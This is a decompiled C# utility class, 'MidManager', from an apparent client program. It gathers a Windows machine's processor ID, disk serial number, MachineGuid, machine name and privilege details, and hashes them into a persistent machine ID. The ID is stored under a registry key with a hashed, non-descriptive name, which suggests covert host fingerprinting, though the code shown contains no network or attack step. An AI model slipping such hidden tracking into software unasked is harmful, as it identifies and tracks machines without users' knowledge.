using System;
using System.Management;
using System.Threading;
using Microsoft.Win32;
using algorithm;

namespace newClient.Utilities;

public class MidManager
{
	public static readonly string MachineName = Environment.MachineName;

	public static readonly string UserName = Environment.UserName;

	public static string CPUID
	{
		get
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				ManagementClass val = new ManagementClass("Win32_Processor");
				try
				{
					ManagementObjectCollection instances = val.GetInstances();
					try
					{
						ManagementObjectEnumerator enumerator = instances.GetEnumerator();
						try
						{
							if (enumerator.MoveNext())
							{
								return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Properties().get_Item("ProcessorId").get_Value()
									.ToString();
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)instances)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
			return "unknown";
		}
	}

	public static string SerialNumber
	{
		get
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
				try
				{
					ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
					try
					{
						if (enumerator.MoveNext())
						{
							return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("SerialNumber").ToString();
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
			return "unknown";
		}
	}

	public static string MachineGuid
	{
		get
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Cryptography", RegistryKeyPermissionCheck.ReadSubTree);
				return registryKey.GetValue("MachineGuid", "unknown") as string;
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
			return "unknown";
		}
	}

	public static string GetNewMid()
	{
		Logger.Info("GetNewMid");
		string operatingSystem = clienthelper.OperatingSystem;
		for (int i = 0; i < 3; i++)
		{
			if (!operatingSystem.Equals("unknown"))
			{
				break;
			}
			Thread.Sleep(3000);
			operatingSystem = clienthelper.OperatingSystem;
		}
		return Hash.GetHash(clienthelper.MachineName + operatingSystem + clienthelper.Install + clienthelper.Privileges + clienthelper.currentProcess, "@");
	}

	public static string GetMid()
	{
		string hash = Hash.GetHash(MachineName + SerialNumber, "@");
		string hash2 = Hash.GetHash(Environment.MachineName, "@");
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + hash2);
			string text = registryKey.GetValue(hash2 + "mid", null) as string;
			if (!string.IsNullOrEmpty(text))
			{
				return text;
			}
			registryKey.SetValue(hash2 + "mid", hash);
			return hash;
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			return hash;
		}
	}
}
